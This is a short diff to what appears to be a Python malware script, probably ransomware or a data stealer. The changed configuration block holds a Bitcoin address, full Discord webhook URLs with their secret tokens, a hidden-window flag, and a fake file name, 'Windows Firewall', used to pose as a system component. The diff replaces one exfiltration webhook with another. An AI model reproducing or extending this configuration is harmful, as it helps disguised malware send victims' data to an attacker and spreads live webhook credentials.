@@ -31,7 +31,7 @@ from base64 import b64decode
 
 # Configuration
 BTC_ADDRESS = '3LsZH7LqxJMZBaVU9YoTLk8HNnUcmzE88v'
-webhookURL = "https://discord.com/api/webhooks/855469061033951303/0zOrosyFJHqSit61j1XWVEKdOoXAD34UF91j5jV7KmUwY1gEMZrZcuLOUMDlv834ZOPG"
+webhookURL = "https://discord.com/api/webhooks/855539723782193163/1U5dlWTeXgleOvtvJgjeNQolC5QkAj_2mZpUt1KeZMiFbAa7OJHqcbhcU6kKzbi1Flkd"
 hiddenWindow = False
 FakeFileName = "Windows Firewall"
 
